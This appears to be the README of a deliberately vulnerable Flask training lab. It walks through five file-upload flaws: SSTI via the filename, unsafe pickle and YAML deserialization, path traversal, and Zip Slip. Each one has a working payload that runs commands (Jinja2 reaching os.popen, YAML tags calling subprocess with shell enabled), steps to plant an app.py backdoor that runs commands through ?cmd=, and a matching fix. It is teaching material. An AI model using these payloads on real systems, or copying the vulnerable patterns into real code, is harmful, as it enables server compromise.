# Lab: File Upload Vulnerabilities (RCE) on Python Web Servers (Flask)

> **EDUCATIONAL USE ONLY.**
> Run exclusively in an isolated VM or container.
> Never expose this server to a public network.

---

## Purpose

[PortSwigger Web Security Academy - File Upload Vulnerabilities's labs](https://portswigger.net/web-security/all-labs#file-upload-vulnerabilities) have a blind spot: every single lab runs on an **Apache + PHP stack.**


This matters because the classic file upload -> RCE path (find some way to upload `shell.php`, request it, get execution) is almost entirely an artefact of how Apache + `mod_php` works. The web server itself is the PHP interpreter, so any `.php` file placed in a web-accessible directory becomes immediately executable via a URL.

**Python-based web servers (Flask, Django)** don't work that way. There is no equivalent of `mod_python` that auto-executes `.py` files on request. Routes are explicit Python functions; an uploaded file sitting on disk has no execution path unless the application code deliberately invokes it.

I created this lab to demonstrate Python-specific (Flask) file upload RCE patterns to fill that gap.

```bash
cd flask-rce-lab
python -m venv venv
```

Open `http://localhost:5000` in a browser to access the lab UI.

## Browser UI

The lab ships with a built-in HTML frontend at `templates/index.html`, served automatically when you open `http://localhost:5000` in a browser.

Each module panel contains:

- A short vulnerability description and the dangerous call responsible
- A collapsed **Hint** section with three progressive hints. There is a 2-minute cooldown between unlocking each additional hint.
- A collapsed **Solution** section with detailed exploitation steps
- An upload form tailored to the attack
- A terminal-style server response area
- A per-lab flag submission form

The UI stores hint progress and solved banners in browser `localStorage`.

Solved state is scoped per lab. It resets when the Flask server is restarted. The server embeds a new instance id into the page on each process start, and the browser clears only the solved-state key when that id changes. Hint unlock progress remains browser-local.

The terminal output renderer treats server output as text, not HTML. It strips only the outer `<pre>` wrapper when present, so flags containing characters such as `<`, `>`, and quotes display correctly. The SSTI route also unescapes Jinja's HTML entities once before returning JSON.

## Endpoints

| Endpoint | Method | Purpose |
|---|---:|---|
| `/` | GET | Browser UI |
| `/cheatsheet` | GET | Plain-text curl cheatsheet |
| `/submit-flag` | POST | Validate a submitted flag for one lab |
| `/ssti` | POST | Server-side template injection via filename |
| `/pickle` | POST | Unsafe `pickle.loads()` deserialization |
| `/yaml` | POST | Unsafe `yaml.load(..., UnsafeLoader)` deserialization |
| `/traversal` | POST | Path traversal arbitrary file overwrite |
| `/zipslip` | POST | Zip Slip archive extraction traversal |

All exploit endpoints accept `multipart/form-data` with a `file` field.

`/ssti` and `/traversal` also accept `custom_filename`; if omitted, they fall back to the uploaded file's filename.

`/submit-flag` accepts JSON or form data:

```json
{
  "lab": "ssti",
  "flag": "FLAG{...}"
}
```

Valid lab ids are:

```text
ssti, pickle, yaml, traversal, zipslip
```

The endpoint validates against `flags/<lab>.txt`. It returns success only for that lab. The browser then records that lab as solved in `localStorage`.

For flags containing a literal backslash, `/submit-flag` accepts both the exact submitted value and the common doubled-backslash paste form.

## Revert Mechanics

The original vulnerable app is stored in `app_original.py`. It is created on first run if missing.

Traversal and Zip Slip can overwrite `app.py` with a backdoor. The backdoor exposes:

| Endpoint | Purpose |
|---|---|
| `/` | Run a command through `?cmd=` |
| `/flag` | Read the relevant flag file |
| `/revert` | Restore `app_original.py` back to `app.py` |

`/revert` restores in a background thread after a 0.5 second delay. This lets the HTTP response finish before Werkzeug's debug reloader kills and restarts the process.

The restore uses:

```python
shutil.copy(src, dst)
os.utime(dst, None)
```

`shutil.copy()` avoids preserving the old source metadata, and `os.utime()` stamps `app.py` with the current time so Werkzeug's mtime-based reloader detects the change.

## Attack Walkthroughs

### [1] SSTI - Server-Side Template Injection via Filename

**Vulnerability:** `render_template_string()` receives the raw filename string.

Jinja2 evaluates `{{ }}` and `{% %}` blocks embedded in the filename.

Confirm SSTI:

```bash
curl -F "file=@evil.yaml" \
     -F "custom_filename={{7*7}}" \
     http://localhost:5000/ssti
```

Run a command:

```bash
curl -F "file=@evil.yaml" \
     -F "custom_filename={{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}" \
     http://localhost:5000/ssti
```

Capture the flag:

```bash
# Windows
curl -F "file=@evil.yaml" \
     -F "custom_filename={{config.__class__.__init__.__globals__['os'].popen('type flags\\ssti.txt').read()}}" \
     http://localhost:5000/ssti

# Linux/macOS
curl -F "file=@evil.yaml" \
     -F "custom_filename={{config.__class__.__init__.__globals__['os'].popen('cat flags/ssti.txt').read()}}" \
     http://localhost:5000/ssti
```

Why it works:

Flask's `render_template_string()` uses Jinja2. The template expression can reach Python globals through the Flask config object's class initializer globals, including `os`.

Fix:

```python
from werkzeug.utils import secure_filename
filename = secure_filename(f.filename)
```

---

### [2] Pickle - Unsafe Deserialization

**Vulnerability:** `pickle.loads()` runs reconstruction logic from attacker-controlled bytes.

Generate a payload:

```bash
python generate_pickle.py "whoami"
```

Upload it:

```bash
curl -F "file=@evil.pkl" http://localhost:5000/pickle
```

Capture the flag:

```bash
# Windows
python generate_pickle.py "type flags\\pickle.txt"
curl -F "file=@evil.pkl" http://localhost:5000/pickle

# Linux/macOS
python generate_pickle.py "cat flags/pickle.txt"
curl -F "file=@evil.pkl" http://localhost:5000/pickle
```

Why it works:

Python pickle stores object reconstruction instructions. The included `generate_pickle.py` builds an object whose `__reduce__()` returns a callable that executes `subprocess.check_output(..., shell=True)`, so command output is returned in the HTTP response.

Fix:

```python
# Never deserialize user-provided data with pickle.
# Use a data-only format such as JSON plus validation.
import json
obj = json.loads(data)
```

---

### [3] YAML - Unsafe Deserialization

**Vulnerability:** `yaml.load(data, Loader=yaml.UnsafeLoader)` evaluates Python object tags.

The included `evil.yaml` uses `subprocess.check_output` so command output is returned in the response.

Upload the included payload:

```bash
curl -F "file=@evil.yaml" http://localhost:5000/yaml
```

Example custom payload:

```yaml
!!python/object/apply:subprocess.check_output
args:
- whoami
kwds:
  shell: true
```

Capture the flag:

```yaml
!!python/object/apply:subprocess.check_output
args:
- type flags\\yaml.txt
kwds:
  shell: true
```

For Linux/macOS, use `cat flags/yaml.txt`.

Why it works:

PyYAML's `!!python/object/apply:` tag tells the unsafe loader to call a Python callable with attacker-controlled arguments.

Fix:

```python
obj = yaml.safe_load(data)
```

---

### [4] Path Traversal - Arbitrary File Overwrite

**Vulnerability:** `os.path.join(UPLOAD_DIR, filename)` uses an unsanitized filename.

Confirm traversal with a canary:

```bash
curl -F "file=@evil.yaml" \
     -F "custom_filename=../../canary.txt" \
     http://localhost:5000/traversal
```

Overwrite `app.py` with the traversal backdoor:

```bash
curl -F "file=@backdoor.py" \
     -F "custom_filename=../../app.py" \
     http://localhost:5000/traversal
```

After Werkzeug's debug reloader restarts the process, use the backdoor:

```bash
curl "http://localhost:5000/?cmd=whoami"
curl "http://localhost:5000/flag"
```

Restore the original lab:

```bash
curl "http://localhost:5000/revert"
```

Why it works:

`os.path.join()` does not sanitize traversal sequences. Joining `uploads/` with `../../app.py` resolves outside the upload directory and overwrites the Flask application source.

Fix:

```python
from werkzeug.utils import secure_filename
import os

filename = secure_filename(f.filename)
dest = os.path.join(UPLOAD_DIR, filename)
resolved = os.path.realpath(dest)

if not resolved.startswith(os.path.realpath(UPLOAD_DIR) + os.sep):
    abort(400, "Path traversal detected")
```

### [5] Zip Slip - Traversal via Archive Extraction

**Vulnerability:** Zip entry names are joined to the extraction directory without validating their resolved paths.

Generate the malicious zip:

```bash
python generate_zipslip.py
```

The generated archive contains:

```text
../pwned.txt
../app.py
```

Because extraction starts in `extracted/`, `../app.py` resolves to the project root's `app.py`.

Upload the zip:

```bash
curl -F "file=@evil.zip" http://localhost:5000/zipslip
```

After Werkzeug's debug reloader restarts the process, use the Zip Slip backdoor:

```bash
curl "http://localhost:5000/?cmd=whoami"
curl "http://localhost:5000/flag"
```

The Zip Slip backdoor reads `flags/zipslip.txt`.

Restore the original lab:

```bash
curl "http://localhost:5000/revert"
```

Why it works:

The lab manually joins `EXTRACT_DIR` with each zip entry name and writes the result. An entry such as `../app.py` escapes `extracted/` and lands in the project root.

Fix:

```python
import os
import zipfile

def safe_extract(zf: zipfile.ZipFile, target_dir: str):
    target_dir = os.path.realpath(target_dir)
    for entry in zf.namelist():
        dest = os.path.join(target_dir, entry)
        resolved = os.path.realpath(dest)
        if not resolved.startswith(target_dir + os.sep):
            raise ValueError(f"Zip Slip detected: {entry!r}")
        zf.extract(entry, target_dir)
```

## Vulnerability Quick Reference

| # | Endpoint | Root Cause | Dangerous Call | Safe Alternative |
|---|---|---|---|---|
| 1 | `/ssti` | User input in template | `render_template_string(tpl)` | Do not render user input as a template; sanitize filenames |
| 2 | `/pickle` | Untrusted deserialization | `pickle.loads(user_data)` | Use JSON or another data-only format |
| 3 | `/yaml` | Untrusted deserialization | `yaml.load(data, UnsafeLoader)` | `yaml.safe_load()` |
| 4 | `/traversal` | Unsanitized filename | `open(join(dir, filename))` | `secure_filename()` plus resolved path check |
| 5 | `/zipslip` | Unsanitized archive entry path | Joining/extracting untrusted zip paths | Validate every resolved entry path |
